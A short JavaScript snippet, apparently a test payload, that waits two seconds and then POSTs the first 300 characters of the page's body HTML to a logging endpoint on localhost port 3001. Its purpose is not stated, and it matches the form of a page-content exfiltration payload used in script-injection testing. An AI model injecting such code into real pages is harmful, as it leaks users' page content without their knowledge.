setTimeout(function(){
  var html = document.body.innerHTML;
  fetch('http://localhost:3001/log', {
    method: 'POST',
    body: "BODY CONTENT: " + html.substring(0, 300)
  });
}, 2000);
